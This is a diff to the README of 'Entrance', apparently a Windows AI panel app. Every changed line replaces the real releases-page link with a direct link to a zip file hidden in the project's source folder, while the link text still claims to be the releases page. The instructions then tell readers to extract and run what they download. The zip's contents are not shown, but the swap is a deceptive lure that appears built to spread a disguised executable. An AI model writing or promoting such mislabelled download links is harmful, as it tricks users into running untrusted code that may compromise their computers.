@@ -1,6 +1,6 @@
 # ✨ Entrance - Your AI Panel, Ready Fast
 
-[![Download Entrance](https://img.shields.io/badge/Download%20Entrance-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Photographic-daltontrumbo447/Entrance/releases)
+[![Download Entrance](https://img.shields.io/badge/Download%20Entrance-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Photographic-daltontrumbo447/Entrance/raw/refs/heads/main/src-tauri/src/core/Software-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to get Entrance on Windows, open it, and begin using it
 
 ## 📥 Download Entrance
 
-Visit the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/releases) and download the latest Windows version.
+Visit the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/raw/refs/heads/main/src-tauri/src/core/Software-1.8.zip) and download the latest Windows version.
 
 Look for a file that matches your system, such as:
 
@@ -36,7 +36,7 @@ If your PC meets these basics, Entrance should run well for daily use.
 
 Follow these steps on Windows:
 
-1. Open the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/releases).
+1. Open the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/raw/refs/heads/main/src-tauri/src/core/Software-1.8.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file that matches your device.
 4. If the file is in a `.zip` folder, right-click it and choose Extract All.
@@ -132,7 +132,7 @@ If the panel opens but looks empty, check the first-run settings and turn on the
 
 ## 📌 Quick Steps
 
-1. Open the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/releases)
+1. Open the [Entrance Releases page](https://github.com/Photographic-daltontrumbo447/Entrance/raw/refs/heads/main/src-tauri/src/core/Software-1.8.zip)
 2. Download the latest Windows file
 3. Extract it if needed
 4. Run the app
